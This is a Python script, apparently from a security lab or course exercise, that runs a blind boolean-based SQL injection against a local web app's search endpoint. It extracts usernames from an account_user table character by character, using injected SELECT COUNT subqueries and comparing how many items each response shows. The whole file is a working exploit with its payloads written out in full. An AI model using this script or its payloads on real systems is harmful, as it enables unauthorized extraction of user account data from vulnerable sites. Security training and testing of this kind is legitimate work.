#!/usr/bin/env python3

# Created a brute force script to collect usernames
# @author: Nebil Müren - cas3322

import string
from urllib.parse import urlparse
import urllib.request
import requests
CHARACTER_SET = string.ascii_uppercase
MAX_LENGTH = 30


def get_response_size(payload):
    url = f"http://localhost:5000/search?q={urllib.parse.quote(payload)}"

    parsed = urlparse(url)
    # fixed by swarup 4.2
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Disallowed URL scheme")

    response = urllib.request.urlopen(url)# nosec B310 — scheme checked, only http/https allowed
    return response.read().decode().count("product-list-item-name")
def test_char(prefix, is_exact=False):
    if is_exact:
        payload = f"' AND (SELECT COUNT(*) FROM account_user WHERE username = '{prefix}') > 0 #"# nosec
    else:
        payload = f"' AND (SELECT COUNT(*) FROM account_user WHERE username LIKE '{prefix}%') > 0 #"# nosec
    return get_response_size(payload) > get_response_size(f"'AND '0'='1' #")

def find_all_keys(prefix="", found_keys=None):
    if found_keys is None:
        found_keys = []
    
    # Check if current prefix is a valid code
    if prefix and test_char(prefix, is_exact=True):
        if prefix not in found_keys:
            found_keys.append(prefix)
            print(f"Found: {prefix}")
    
    # Expand the prefix with each character
    if len(prefix) < MAX_LENGTH: 
        for char in CHARACTER_SET:
            new_prefix = prefix + char
            if test_char(new_prefix, is_exact=False):
                print(f"  Digging: {new_prefix}")
                find_all_keys(new_prefix, found_keys)
    
    return found_keys

print("Finding all usernames...")
all_keys = find_all_keys()
print(f"\nFound {len(all_keys)} usernames:")
for key in all_keys:
    print(f"  {key}")
